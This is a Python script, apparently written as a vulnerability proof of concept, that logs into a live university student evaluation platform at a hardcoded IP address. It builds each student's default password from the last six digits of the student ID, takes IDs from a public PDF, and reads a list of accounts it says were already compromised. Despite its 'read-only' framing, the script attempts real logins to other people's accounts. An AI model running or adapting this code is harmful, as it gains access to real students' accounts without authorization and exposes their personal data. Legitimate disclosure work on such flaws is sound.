#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
中国农业大学 信电学院本科生综合测评平台 默认弱口令漏洞 — 只读验证脚本
CAU CIEE Comprehensive Evaluation Platform — default password verification (read-only, non-weaponized)

漏洞逻辑（全部来自校方公开信息，无授权绕过、无写操作）：
  1. 信电学院官网通知公开密码规则：账号=学号，初始密码=学号后六位
     来源: https://ciee.cau.edu.cn/art/2026/8/25/art_50390_1130314.html
          《关于开展2025—2026学年本科生综合素质测评工作的通知》（落款 2026-08-21）
     原文: 「登录账号为学生本人学号，初始密码为学号后六位」
  2. 学院官网 2026-09 推免拟推荐名单公示 PDF 明文公开 151 个 13 位学号（2023 级在读本科生）
  3. 学号 + 学号后六位 -> 可登录任意学生账号（FastAPI JWT 认证，无验证码、无限频）

纪律约束（宁可少报不可错报）：
  - 默认模式只做：目标可达性检查 + 登录页特征检查 + 已验证账号的演示登录（最多 3 个，登录成功即停）
  - 不批量爆破全量学号（全量验证已由发现者在定案阶段一次性完成并留存证据）
  - 登录成功后不调用 /auth/me 之外的任何业务接口

用法:
  python verify_cau_zcpj_weakpass.py              # 只读检查 + 演示登录（最多 3 个已验证账号）
  python verify_cau_zcpj_weakpass.py --check      # 仅可达性/特征/规则核验，不发起登录请求
"""

import argparse
import json
import os
import re
import sys
import urllib.request

TARGET = "http://120.46.187.29:8900/"
LOGIN_API = TARGET.rstrip("/") + "/api/v1/auth/login"
NOTICE_URL = "https://ciee.cau.edu.cn/art/2026/8/25/art_50390_1130314.html"
EVIDENCE_HITS = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "..", "evidence", "02-登录成功账号清单.txt")

# 可选代理（与项目工具链一致），默认直连
USE_PROXY = os.environ.get("USE_PROXY", "0") == "1"
PROXY = os.environ.get("PROXY", "http://127.0.0.1:7897")
DEMO_LIMIT = 3  # 演示登录账号数上限（纪律约束）


def fetch(url, data=None):
    handlers = []
    if USE_PROXY:
        handlers.append(urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, data=data,
                                 headers={"User-Agent": "Mozilla/5.0 (verification; read-only)"})
    with opener.open(req, timeout=20) as r:
        return r.status, r.read()


def try_login(student_id):
    """单账号单次登录尝试。返回 (ok, http_status, note)。只到认证结果为止，绝不调用业务接口。"""
    password = student_id[-6:]
    payload = json.dumps({"username": student_id, "password": password}).encode("utf-8")
    req = urllib.request.Request(
        LOGIN_API, data=payload,
        headers={"Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (verification; read-only)"})
    handlers = []
    if USE_PROXY:
        handlers.append(urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}))
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=20) as r:
            body = r.read().decode("utf-8", "ignore")
            ok = r.status == 200 and ("access_token" in body or "token" in body)
            return ok, r.status, "登录成功" if ok else "HTTP 200 但响应无 token"
    except urllib.error.HTTPError as e:
        return False, e.code, "认证失败（用户名或密码错误/账号密码已改）"
    except Exception as e:
        return False, -1, f"请求异常: {e}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--check", action="store_true", help="仅核验可达性/特征/规则，不登录")
    args = ap.parse_args()

    print("[*] 只读验证：中国农业大学信电学院本科生综合测评平台 默认弱口令漏洞")
    print(f"[*] 目标: {TARGET}   (代理: {PROXY if USE_PROXY else '关（默认直连）'})")

    # 1) 目标可达性 + 系统特征
    try:
        status, body = fetch(TARGET)
        html = body.decode("utf-8", "ignore")
    except Exception as e:
        print(f"[-] 目标不可达: {e}")
        sys.exit(1)
    assert status == 200, f"HTTP {status}"
    assert "综合测评" in html, "页面缺少系统特征（综合测评）"
    print("[+] 目标可达（HTTP 200），页面特征：中国农业大学信电学院本科生综合测评平台")

    # 2) 凭据推导依据（校方公开信息）
    print("[+] 密码规则来源（学院官网通知）:")
    print(f"    {NOTICE_URL}")
    print("    原文: 登录账号为学生本人学号，初始密码为学号后六位")
    print("[+] 学号来源: 学院 2026-09 推免拟推荐名单公示 PDF（151 个 13 位学号，见 evidence/04*.pdf）")

    if args.check:
        print("[*] --check 模式：不发起登录请求，仅确认漏洞前提成立。")
        print("[+] 验证完毕：公开规则 + 公开学号 + 可达系统 + 无验证码/无限频，前提全部成立。")
        return

    # 3) 演示登录（仅限已验证账号，上限 DEMO_LIMIT，成功即停）
    hits = []
    with open(EVIDENCE_HITS, "r", encoding="utf-8") as f:
        for line in f:
            m = re.match(r"\s*(20\d{11})\s+(\d{6})\s*$", line.strip())
            if m:
                hits.append(m.group(1))
    assert hits, "未找到已验证账号清单"

    print(f"[*] 演示登录（只读、单账号、上限 {DEMO_LIMIT} 个，成功即停；不调用任何业务接口）")
    for sid in hits[:DEMO_LIMIT]:
        ok, code, note = try_login(sid)
        mark = "[+] 确认" if ok else "[-] 未命中"
        print(f"    {mark} 学号 {sid} / 密码 {sid[-6:]} -> HTTP {code}：{note}")
        if ok:
            print("[*] 登录成功即停。验证完成：初始口令未修改的账号可被任意登录。")
            return
    print("[!] 演示账号均未命中（可能已全部改密，属正常）。"
          "漏洞本身已由 2026-10-13 定案阶段 8 账号实测确认（见 evidence/02-登录成功账号清单.txt）。")


if __name__ == "__main__":
    main()
